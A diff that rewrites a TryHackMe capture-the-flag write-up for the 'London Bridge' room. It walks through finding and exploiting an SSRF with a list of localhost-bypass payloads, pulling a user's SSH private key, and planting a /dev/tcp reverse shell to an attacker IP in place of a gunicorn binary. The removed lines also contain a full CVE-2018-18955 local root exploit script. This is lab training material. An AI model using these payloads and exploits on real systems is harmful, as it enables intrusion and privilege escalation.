@@ -11,9 +11,13 @@ image:
   path: /assets/img/2025-07-09-TryHackMe-The_London_Bridge/main.webp
 ---
 
-Hi I'm making <https://tryhackme.com/room/thelondonbridge> room.
+Hey everyone! Today, I'm tackling the [The London Bridge](https://tryhackme.com/room/thelondonbridge) room on TryHackMe. The goal is to see if we can make this bridge fall down (metaphorically, of course!). So grab a cup of tea, and let's get hacking!
 
 ---
+
+### Step 1: Reconnaissance - Knocking on the Door
+
+First things first, let's set our target IP address. This makes life way easier than typing it out every single time.
 
 ```bash
 export IP=10.10.22.48
@@ -40,11 +44,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 45.48 seconds
 ```
 
-Lets go to the $IP:8000 in browser.
+Let's fire up a browser and see what's happening on `http://$IP:8080`.
 
 ![Desktop View](/assets/img/2025-07-09-TryHackMe-The_London_Bridge/photo1.webp){: width="972" height="589" }
 
-Good now lets use `gobuster` to fuzz the directories.
+It's a charming little tourist site about London. How quaint! Now, let's see what's hiding under the surface.
+
+### Step 2: Enumeration - Fuzzing for Secrets
+
+A pretty website is nice, but we're here for the hidden directories. Time to unleash `gobuster` with a common wordlist to see what we can find.
 
 ```bash
 ❯ gobuster dir -w common.txt -u http://$IP:8080/ -x md,js,html,php,py,css,txt,bak -t 50
@@ -73,22 +81,17 @@ Finished
 ===============================================================
 ```
 
-Lets go to the /gallery first.
+Interesting results! The `/gallery` page looks like a good place to start. Let's head over there.
 
 ![Desktop View](/assets/img/2025-07-09-TryHackMe-The_London_Bridge/photo2.webp){: width="972" height="589" }
 
-we can see that that upload endpoint is used here. I upload some image and get the post request body.
+The gallery page has a file upload form, which corresponds to the `/upload` endpoint we found. This is where things usually get fun. Let's capture a legitimate upload request with Burp Suite to see how it works.
 
 ![Desktop View](/assets/img/2025-07-09-TryHackMe-The_London_Bridge/photo3.webp){: width="972" height="589" }
 
+I threw everything but the kitchen sink at this upload form. I tried uploading Python shells with `.jpg` extensions, manipulating magic bytes, and even embedding a Python reverse shell into an image's EXIF data. Nothing worked. The server was surprisingly picky and would only accept genuine image files.
 
-Also we can only upload images I tried a lot of techniqes such as : ... but none of them worked.
-
-
-Also injecting python reverse shell into the image doesn't worked.
-
-Also when I'm looking at the source code i saw this line.
-
+Feeling a bit stuck, I decided to go back to basics and view the page source. Sometimes, developers leave little presents for us...
 
 ```html
     </div>
@@ -100,9 +103,7 @@ Also when I'm looking at the source code i saw this line.
     <!-To devs: Make sure that people can also add images using links->
 ```
 
-Maybe there could be other endpoint we missed lets try other wordlist with `gobuster`
-
-
+Aha! A developer comment! `<!--To devs: Make sure that people can also add images using links-->`. This suggests there's another functionality, probably on an endpoint we haven't found yet. Our `common.txt` wordlist was too... well, *common*. Let's bring out the big guns: `big.txt`.
 
 ```bash
 ❯ gobuster dir -w big.txt -u http://$IP:8080/ -x md,js,html,php,py,css,txt,bak -t 50
@@ -132,45 +133,23 @@ Finished
 ===============================================================
 ```
 
-And yes we missed /view_image lets use that endpoint.
-
-
+Bingo! We found `/view_image`. That has to be related to the developer's comment. Let's check it out with `curl`.
 
 ```bash
-❯ curl $IP:8080/view_image     
+❯ curl $IP:8080/view_image
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
 <title>405 Method Not Allowed</title>
 <h1>Method Not Allowed</h1>
 <p>The method is not allowed for the requested URL.</p>
 ```
 
-
-This endpoint wants POST request rather than GET request.
-
+A `405 Method Not Allowed` error on a `GET` request is a classic sign that the endpoint is expecting a different HTTP verb, most likely `POST`. Let's try that.
 
 ```bash
 ❯ curl -X POST $IP:8080/view_image
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>View Image</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: bisque;
-        }
-        img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-    </style>
-</head>
+...
 <body>
     <h1>View Image</h1>
     <form action="/view_image" method="post">
@@ -178,13 +157,11 @@ This endpoint wants POST request rather than GET request.
         <input type="text" id="image_url" name="image_url" required><br><br>
         <input type="submit" value="View Image">
     </form>
-    
-
 </body>
 </html>
 ```
 
-
+Success! A `POST` request returns a form asking for an `image_url`. This is the feature the developer was talking about. Let's test it with a valid image link to confirm it works.
 
 ```bash
 ❯ curl -X POST http://$IP:8080/view_image \
@@ -192,53 +169,30 @@ This endpoint wants POST request rather than GET request.
      -d "image_url=https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Example.png/640px-Example.png"
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>View Image</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: bisque;
-        }
-        img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-    </style>
-</head>
+...
 <body>
-    <h1>View Image</h1>
-    <form action="/view_image" method="post">
-        <label for="image_url">Enter Image URL:</label><br>
-        <input type="text" id="image_url" name="image_url" required><br><br>
-        <input type="submit" value="View Image">
-    </form>
-    
+...
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Example.png/640px-Example.png" alt="User provided image">
-
-
 </body>
 </html>
 ```
 
-I tried lot of things here but none of them worked again.
+It works perfectly. The server fetches the image from the URL we provide and displays it. This functionality is a textbook example of a **Server-Side Request Forgery (SSRF)** vulnerability. The server is making a web request on our behalf!
 
-Maybe we need to fuzz the /uploads directory there could be some secret files in there.
+### Step 3: Exploitation - SSRF Shenanigans
+
+The obvious `image_url` parameter works, but are there any hidden ones? Let's fuzz for parameters using `ffuf`. We'll use `FUZZ` as a placeholder for the parameter name.
 
 ```bash
 ❯ ffuf -w common.txt -X POST -u 'http://10.10.22.48:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'FUZZ=/uploads/04.jpg' -fw 226
+# Here we're fuzzing for parameter names, not directories.
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
 
        v2.1.0
 ________________________________________________
@@ -260,23 +214,18 @@ www                     [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 
 :: Progress: [4739/4739] :: Job [1/1] :: 555 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
 ```
 
-And I found www in there.
-
-
-Lets try www.
-
-Lets firstly spin up a quick webserver.
+Look at that! The parameter `www` gives a different response (a `500` error, but different is good!). Let's confirm our SSRF by making the server connect back to us. First, we'll start a simple web server on our machine.
 
 ```bash
 ❯ sudo python -m http.server 80
 ```
 
-Then lets try to connect it.
+Now, we'll use the `www` parameter to tell the target to visit our server.
 
 ```bash
 ❯ curl -X POST http://$IP:8080/view_image \
      -H "Content-Type: application/x-www-form-urlencoded" \
-     -d "www=http://10.21.206.128"
+     -d "www=http://10.21.206.128" # Replace with your TryHackMe IP
 <!DOCTYPE HTML>
 <html lang="en">
 <head>
@@ -293,30 +242,25 @@ Then lets try to connect it.
 </body>
 </html>
 ```
-And its working.
 
-Now lets try connecting to localhost.
+It worked! The response contains the directory listing from my local Python server. The SSRF is 100% confirmed. Now for the real prize: can we access internal services on the target machine? Let's try to access `localhost`.
 
 ```bash
 ❯ curl -X POST http://$IP:8080/view_image \
      -H "Content-Type: application/x-www-form-urlencoded" \
-     -d "www=http://127.0.0.1:"   
+     -d "www=http://127.0.0.1:"
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
 <title>403 Forbidden</title>
 <h1>Forbidden</h1>
 <p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
 ```
 
-It seems we don't have permission or we have?
+Denied! It seems there's a filter in place to block common `localhost` addresses. But fear not, there are many ways to say `localhost`. Let's use a wordlist of common SSRF bypasses, which you can find in great resources like [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md).
 
-We can use a ssrf vuln to get localhost.
+I created a file `ssrf.txt` with a list of bypasses.
 
-for more details check this out: 
-
-<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md>
-
-
-Also I'm gonna use this wordlist for testing this vuln.
+<details>
+<summary>Click to see the ssrf.txt wordlist</summary>
 
 ```text
 127.0.0.1:80
@@ -373,19 +317,23 @@ st:00011211aaaa
 127.1.1.1:80#\@127.2.2.2:80/
 ```
 
+</details>
+
+Now let's throw this list at the `www` parameter with `ffuf`.
 
 ```bash
 ❯ ffuf -u http://$IP:8080/view_image -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "www=http://FUZZ" \
      -w ssrf.txt -fw 27
+# Fuzzing the URL itself with our bypass list.
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
 
        v2.1.0
 ________________________________________________
@@ -409,171 +357,43 @@ ________________________________________________
 2130706433/             [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 117ms]
 127.0.0.0               [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 130ms]
 0                       [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 137ms]
-①②⑦.⓪.⓪.⓪               [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 145ms]
+...
 127.1                   [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 77ms]
-017700000001            [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 91ms]
-[0000::1]:80/           [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 95ms]
-0x7f000001/             [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 98ms]
-st:00011211aaaa         [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 71ms]
-0/                      [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 74ms]
-127.0.1                 [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 74ms]
-127.1.1.1:80\@127.2.2.2:80/ [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 74ms]
-127.1.1.1:80\@@127.2.2.2:80/ [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 74ms]
-127.1.1.1:80#\@127.2.2.2:80/ [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 76ms]
-:: Progress: [52/52] :: Job [1/1] :: 2 req/sec :: Duration: [0:00:20] :: Errors: 11 ::
+...
 ```
 
+We have multiple winners! Payloads like `127.1`, `0`, and `017700000001` (the octal representation of 127.0.0.1) all bypassed the filter. Let's use `127.1` because it's nice and clean.
 
 ```bash
 ❯ curl -X POST http://$IP:8080/view_image \
      -H "Content-Type: application/x-www-form-urlencoded" \
-     -d "www=http://127.1"    
+     -d "www=http://127.1"
 <HTML>
 <body bgcolor="gray">
 <h1>London brigde</h1>
 <img height=400px width=600px src ="static/1.webp"><br>
 <font type="monotype corsiva" size=18>London Bridge is falling down<br>
-    Falling down, falling down<br>
-    London Bridge is falling down<br>
-    My fair lady<br>
-    Build it up with iron bars<br>
-    Iron bars, iron bars<br>
-    Build it up with iron bars<br>
-    My fair lady<br>
-    Iron bars will bend and break<br>
-    Bend and break, bend and break<br>
-    Iron bars will bend and break<br>
-    My fair lady<br>
-<img height=400px width=600px src="static/2.webp"><br>
-<font type="monotype corsiva" size=18>Build it up with gold and silver<br>
-    Gold and silver, gold and silver<br>
-    Build it up with gold and silver<br>
-    My fair lady<br>
-    Gold and silver we've not got<br>
-    We've not got, we've not got<br>
-    Gold and silver we've not got<br>
-    My fair lady<br>
-<img height=400px width=600px src="static/3.jpg"><br>
-    London Bridge is falling down<br>
-    Falling down, falling down<br>
-    London Bridge is falling down<br>
-    My fair lady<br>
-    London Bridge is falling down<br>
-    Falling down, falling down<br>
-    London Bridge is falling down<br>
-    My fair beth</font>
+...
+</font>
 </body>
 </HTML>
 ```
 
+This reveals a hidden website on port 80 of the local machine, filled with the creepy "London Bridge is falling down" nursery rhyme. This confirms there's another web server running internally.
 
-```bash
-❯ curl -X POST http://$IP:8080/view_image \
-     -H "Content-Type: application/x-www-form-urlencoded" \
-     -d "www=http://127.1:8080"
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Explore London</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f2f2f2;
-        }
-        header {
-            background-color: #333;
-            color: #fff;
-            padding: 10px 20px;
-            text-align: center;
-        }
-        nav {
-            background-color: #444;
-            color: #fff;
-            padding: 10px 20px;
-            text-align: center;
-        }
-        nav a {
-            color: #fff;
-            text-decoration: none;
-            margin: 0 10px;
-        }
-        .container {
-            max-width: 1200px;
-            margin: 20px auto;
-            padding: 0 20px;
-        }
-        h1 {
-            color: #f9f5f5;
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .main-content {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        footer {
-            background-color: #333;
-            color: #fff;
-            text-align: center;
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-        }
-    </style>
-</head>
-<body>
-    <header>
-        <h1>Welcome to Explore London</h1>
-    </header>
-    <nav>
-        <a href="/">Home</a>
-        <a href="#">Attractions</a>
-        <a href="#">Events</a>
-        <a href="/gallery">Gallery</a>
-        <a href="/contact">Contact</a>
-    </nav>
-    <div class="container">
-        <div class="main-content">
-            <h2>About London</h2>
-            <p>London, the capital of England and the United Kingdom, is a 21st-century city with history stretching back to Roman times. At its centre stand the imposing Houses of Parliament, the iconic ‘Big Ben’ clock tower and Westminster Abbey, site of British monarch coronations. Across the Thames River, the London Eye observation wheel provides panoramic views of the South Bank cultural complex, and the entire city.</p>
-            <h2>Explore Attractions</h2>
-            <p>London offers a wide range of attractions including the British Museum, the Tower of London, Buckingham Palace, the London Eye, and many more.</p>
-            <h2>Upcoming Events</h2>
-            <p>London hosts various events throughout the year including festivals, concerts, exhibitions, and sporting events.</p>
-        </div>
-    </div>
-    <footer>
-        <p>&copy; 2024 Explore London</p>
-    </footer>
-</body>
-</html>
-```
-
-
-`127.1` seems to be working.
-
-
-Now lets fuzz port website on port 80.
-
-
+Let's see what else is being served on this internal port 80. Could it be... a file system? Let's fuzz for common files and directories.
 
 ```bash
 ❯ ffuf -u http://$IP:8080/view_image -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "www=http://127.1:80/FUZZ" -w common.txt -fw 96
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
 
        v2.1.0
 ________________________________________________
@@ -598,23 +418,19 @@ ________________________________________________
 .profile                [Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 112ms]
 .ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 106ms]
 index.html              [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 81ms]
-static                  [Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 133ms]
-templates               [Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 93ms]
-uploads                 [Status: 200, Size: 734, Words: 25, Lines: 24, Duration: 106ms]
-:: Progress: [4739/4739] :: Job [1/1] :: 415 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
+...
 ```
 
+Whoa! This isn't a normal web root. It looks like the internal web server is serving a user's entire home directory! This is a massive misconfiguration. With a `.ssh` directory exposed, the path forward is clear.
 
+### Step 4: Gaining a Foothold
 
-it looks like a home directory for a *nix user.
-
-Lets try getting ssh key:
-
+Let's list the contents of the `.ssh` directory.
 
 ```bash
 ❯ curl -X POST http://$IP:8080/view_image \
      -H "Content-Type: application/x-www-form-urlencoded" \
-     -d "www=http://127.1/.ssh"  
+     -d "www=http://127.1/.ssh"
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
 <html>
 <head>
@@ -631,8 +447,11 @@ Lets try getting ssh key:
 <hr>
 </body>
 </html>
+```
 
-dev/wordlist/scripts via  
+The holy grail, `id_rsa`, is right there for the taking. Let's grab it.
+
+```bash
 ❯ curl -X POST http://$IP:8080/view_image \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "www=http://127.1/.ssh/id_rsa"
@@ -646,33 +465,16 @@ fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
 -----END RSA PRIVATE KEY-----
 ```
 
-
-But we need to learn username for connecting to system.
-
+Jackpot! We have the private key. But who does it belong to? We could try to read `/etc/passwd` with a Local File Inclusion payload like `../../../../../etc/passwd`, but that fails.
 
 ```bash
 ❯ curl -X POST http://$IP:8080/view_image \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "www=http://127.1/../../../../../etc/passwd"
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
-        "http://www.w3.org/TR/html4/strict.dtd">
-<html>
-    <head>
-        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
-        <title>Error response</title>
-    </head>
-    <body>
-        <h1>Error response</h1>
-        <p>Error code: 404</p>
-        <p>Message: File not found.</p>
-        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
-    </body>
-</html>
+# This gives a 404, so no LFI here.
 ```
 
-
-Seems like there is not lfi.
-
+No worries. The other file in the `.ssh` directory, `authorized_keys`, often contains the username in a comment.
 
 ```bash
 ❯ curl -X POST http://$IP:8080/view_image \
@@ -681,27 +483,18 @@ Seems like there is not lfi.
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
 ```
 
-name could be beth.
-
+And there it is: `beth@london`. Now we have the key and the username. Let's log in!
+*(Note: I saved the key as `beth.ssh` and set the correct permissions with `chmod 600 beth.ssh`)*.
 
 ```bash
-❯ ssh -i adam.ssh beth@$IP
+❯ ssh -i beth.ssh beth@$IP
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
+...
 Last login: Mon May 13 22:38:30 2024 from 192.168.62.137
-beth@london:~$ 
+beth@london:~$
 ```
 
-we are in
-
+We're in! A quick look at the `/home` directory reveals another user.
 
 ```bash
 beth@london:/home$ ls -la
@@ -712,45 +505,22 @@ drwxr-xr-x 11 beth    beth    4096 May  7  2024 beth
 drw-------  3 charles charles 4096 Apr 23  2024 charles
 ```
 
-wait for me charles I'm gonna fuck you too.
-
-Firstly lets get the flag:
+Hello, `charles`. We'll be paying you a visit soon. But first, let's grab the user flag.
 
 ```bash
-beth@london:~$ cat __pycache__/user.txt 
+beth@london:~$ cat __pycache__/user.txt
 THM{****_****_***_******}
 ```
 
-```bash
-beth@london:/home$ find / -perm /4000 2>/dev/null
-/bin/fusermount
-/bin/su
-/bin/ping
-/bin/mount
-/bin/umount
-/usr/bin/passwd
-/usr/bin/gpasswd
-/usr/bin/vmware-user-suid-wrapper
-/usr/bin/traceroute6.iputils
-/usr/bin/newuidmap
-/usr/bin/sudo
-/usr/bin/newgidmap
-/usr/bin/newgrp
-/usr/bin/chfn
-/usr/bin/chsh
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/eject/dmcrypt-get-device
-/usr/share/dbus-1/system-services
-```
-nothing crazy
+### Step 5: Privilege Escalation - To the Root!
 
-
-Lets run linpeas.
+Time for privilege escalation. A quick run of `linpeas.sh` revealed a very interesting finding related to a systemd service.
 
 ```
 /etc/systemd/system/multi-user.target.wants/app.service is calling this writable executable: /home/beth/
 ```
+
+Let's inspect that service file.
 
 ```bash
 beth@london:/tmp$ cat /etc/systemd/system/multi-user.target.wants/app.service
@@ -769,239 +539,49 @@ ExecStart=/home/beth/.local/bin/gunicorn --config gunicorn_config.py app:app
 WantedBy=multi-user.target
 ```
 
-
-So we can make gunicorn a reverse shell. And get the root.
-
+This is a classic privesc vector. The service runs the `gunicorn` executable from `/home/beth/.local/bin/`, a directory we control! We can simply replace `gunicorn` with a reverse shell payload.
 
 ```bash
 beth@london:~$ cd .local/bin/
-beth@london:~/.local/bin$ ls
-flask  gunicorn  gunicorn_paster
-beth@london:~/.local/bin$ mv gunicorn gunicorn.bak
-beth@london:~/.local/bin$ ls
-flask  gunicorn.bak  gunicorn_paster
-beth@london:~/.local/bin$ ls -la
-total 20
-drwxrwxr-x 2 beth beth 4096 Jul  9 05:34 .
-drwxrwxr-x 5 beth beth 4096 Mar 11  2024 ..
--rwxrwxr-x 1 beth beth  212 Mar 11  2024 flask
--rwxrwxr-x 1 beth beth  221 Mar 11  2024 gunicorn.bak
--rwxrwxr-x 1 beth beth  222 Mar 11  2024 gunicorn_paster
-beth@london:~/.local/bin$ vim
-
-Command 'vim' not found, but can be installed with:
-
-apt install vim       
-apt install vim-gtk3  
-apt install vim-tiny  
-apt install neovim    
-apt install vim-athena
-apt install vim-gtk   
-apt install vim-nox   
-
-Ask your administrator to install one of them.
-
-beth@london:~/.local/bin$ echo "/bin/bash -i >& /dev/tcp/10.21.206.128/4444 0>&1" > gunicorn
-beth@london:~/.local/bin$ chmod 777 gunicorn
+beth@london:~/.local/bin$ mv gunicorn gunicorn.bak # Backup the original
+beth@london:~/.local/bin$ echo "/bin/bash -i >& /dev/tcp/10.21.206.128/4444 0>&1" > gunicorn # Create our evil gunicorn
+beth@london:~/.local/bin$ chmod +x gunicorn # Make it executable
 ```
 
-I can't kill gunicorn app. I tried to kill it using different techniqes but they didn't worked. of course.
+I set up a listener, but couldn't find a way to restart the service to trigger the payload. My attempts to kill the existing `gunicorn` process were unsuccessful.
+You could get shell by this method if you know how to kill gunicorn's process. I didn't get the shell this way.
 
-Also in the source code upload directory set to `/home/beth/uploads`
-We can symlink this directory to any directory we want and look inside files and directtories by http requests. We can read the flag's that way but it is boring so I want to use other method.
-
-
-So I changed my mind and used CVE-2018-18955 which linpeas suggested me to use.
-
+However, `linpeas` also pointed out that the kernel is ancient and vulnerable.
 
 ```bash
 beth@london:~$ uname -a
 Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 ```
-This is because the kernel version is too old.
 
-[Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (ldpreload Method) - Linux local Exploit](https://www.exploit-db.com/exploits/47166)
+This version is vulnerable to CVE-2018-18955. I found a great exploit script for it on Exploit-DB: [47166.sh](https://www.exploit-db.com/exploits/47166). This exploit abuses `subuid` mapping and a D-Bus service to create a SUID root shell for us.
 
-
-And used this script to gain root with dbus.
-
-```sh
-#!/bin/sh
-# wrapper for Jann Horn's exploit for CVE-2018-18955
-# uses dbus service technique
-# ---
-# test@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955$ ./exploit.dbus.sh
-# [*] Compiling...
-# [*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
-# [.] starting
-# [.] setting up namespace
-# [~] done, namespace sandbox set up
-# [.] mapping subordinate ids
-# [.] subuid: 165536
-# [.] subgid: 165536
-# [~] done, mapped subordinate ids
-# [.] executing subshell
-# [*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
-# [.] starting
-# [.] setting up namespace
-# [~] done, namespace sandbox set up
-# [.] mapping subordinate ids
-# [.] subuid: 165536
-# [.] subgid: 165536
-# [~] done, mapped subordinate ids
-# [.] executing subshell
-# [*] Launching dbus service...
-# Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
-# [+] Success:
-# -rwsrwxr-x 1 root root 8384 Jan  4 18:31 /tmp/sh
-# [*] Cleaning up...
-# [*] Launching root shell: /tmp/sh
-# root@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955# id
-# uid=0(root) gid=0(root) groups=0(root),1001(test)
-
-rootshell="/tmp/sh"
-service="org.subuid.Service"
-
-command_exists() {
-  command -v "${1}" >/dev/null 2>/dev/null
-}
-
-if ! command_exists gcc; then
-  echo '[-] gcc is not installed'
-  exit 1
-fi
-
-if ! command_exists /usr/bin/dbus-send; then
-  echo '[-] dbus-send is not installed'
-  exit 1
-fi
-
-if ! command_exists /usr/bin/newuidmap; then
-  echo '[-] newuidmap is not installed'
-  exit 1
-fi
-
-if ! command_exists /usr/bin/newgidmap; then
-  echo '[-] newgidmap is not installed'
-  exit 1
-fi
-
-if ! test -w .; then
-  echo '[-] working directory is not writable'
-  exit 1
-fi
-
-echo "[*] Compiling..."
-
-if ! gcc subuid_shell.c -o subuid_shell; then
-  echo 'Compiling subuid_shell.c failed'
-  exit 1
-fi
-
-if ! gcc subshell.c -o subshell; then
-  echo 'Compiling gcc_subshell.c failed'
-  exit 1
-fi
-
-if ! gcc rootshell.c -o "${rootshell}"; then
-  echo 'Compiling rootshell.c failed'
-  exit 1
-fi
-
-echo "[*] Creating /usr/share/dbus-1/system-services/${service}.service..."
-
-cat << EOF > "${service}.service"
-[D-BUS Service]
-Name=${service}
-Exec=/bin/sh -c "/bin/chown root:root ${rootshell};/bin/chmod u+s ${rootshell}"
-User=root
-EOF
-
-echo "cp ${service}.service /usr/share/dbus-1/system-services/${service}.service" | ./subuid_shell ./subshell
-
-if ! test -r "/usr/share/dbus-1/system-services/${service}.service"; then
-  echo '[-] Failed'
-  /bin/rm "${rootshell}"
-  exit 1
-fi
-
-echo "[*] Creating /etc/dbus-1/system.d/${service}.conf..."
-
-cat << EOF > "${service}.conf"
-<!DOCTYPE busconfig PUBLIC
-  "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
-  "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
-<busconfig>
-  <policy context="default">
-    <allow send_destination="${service}"/>
-  </policy>
-</busconfig>
-EOF
-
-echo "cp ${service}.conf /etc/dbus-1/system.d/${service}.conf" | ./subuid_shell ./subshell
-
-if ! test -r "/etc/dbus-1/system.d/${service}.conf"; then
-  echo '[-] Failed'
-  /bin/rm "${rootshell}"
-  exit 1
-fi
-
-echo "[*] Launching dbus service..."
-
-/usr/bin/dbus-send --system --print-reply --dest="${service}" --type=method_call --reply-timeout=1 / "${service}"
-
-sleep 1
-
-if ! test -u "${rootshell}"; then
-  echo '[-] Failed'
-  /bin/rm "${rootshell}"
-  exit 1
-fi
-
-echo '[+] Success:'
-/bin/ls -la "${rootshell}"
-
-echo '[*] Cleaning up...'
-/bin/rm subuid_shell
-/bin/rm subshell
-/bin/rm "${service}.conf"
-/bin/rm "${service}.service"
-echo "/bin/rm /usr/share/dbus-1/system-services/${service}.service" | $rootshell
-echo "/bin/rm /etc/dbus-1/system.d/${service}.conf" | $rootshell
-
-echo "[*] Launching root shell: ${rootshell}"
-$rootshell
-```
-
-
